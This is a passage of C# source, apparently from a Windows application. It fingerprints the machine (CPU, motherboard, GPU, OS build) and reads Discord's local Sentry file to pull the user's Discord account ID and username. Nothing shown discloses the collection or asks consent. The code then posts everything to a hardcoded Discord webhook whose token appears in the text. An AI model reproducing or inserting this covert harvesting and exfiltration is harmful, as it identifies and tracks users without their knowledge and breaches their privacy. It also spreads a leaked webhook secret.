                            .Cast<ManagementObject>()
                            .FirstOrDefault();
            string cpuName = cpuObj?["Name"]?.ToString() ?? "";

            var boardObj = new ManagementObjectSearcher("SELECT Manufacturer, Product FROM Win32_BaseBoard")
                              .Get()
                              .Cast<ManagementObject>()
                              .FirstOrDefault();
            string motherboard = boardObj != null ? $"{boardObj["Manufacturer"]} {boardObj["Product"]}" : "";

            var gpuObjs = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController")
                              .Get()
                              .Cast<ManagementObject>();
            string gpus = string.Join(", ", gpuObjs.Select(g => g["Name"]?.ToString() ?? ""));

            using var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            string build = key.GetValue("CurrentBuild")?.ToString() ?? "";
            string ubr = key.GetValue("UBR")?.ToString() ?? "";
            string osVersion = $"{build}.{ubr}";

            string discordId = "Failed to get Discord account id";
            string discordUsername = "Failed to get Discord username";

            string discordJsonPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "sentry", "scope_v3.json");
            if (File.Exists(discordJsonPath))
            {
                try
                {
                    string jsonText = File.ReadAllText(discordJsonPath);
                    using JsonDocument doc = JsonDocument.Parse(jsonText);

                    if (doc.RootElement.TryGetProperty("scope", out var scope) &&
                        scope.TryGetProperty("user", out var user))
                    {
                        discordId = user.GetProperty("id").GetString() ?? discordId;
                        discordUsername = user.GetProperty("username").GetString() ?? discordUsername;
                    }
                }
                catch
                {

                }
            }

            using var client = new HttpClient();

            using var multipart = new MultipartFormDataContent
            {
                { new StringContent($"{discordUsername}\n{discordId}\n{cpuName}\n{motherboard}\n{gpus}\n{osVersion}\n{ProcessInfoHelper.Version}"), "content" }
            };

            await client.PostAsync("https://discord.com/api/webhooks/1444743483486240860/V_myd24FjH7TNJPruYbNJcnuE9Xany7C-tAScpygDV_FOGnwmuamSuOgXdxlts1Q2MhM", multipart);
        }
    }
}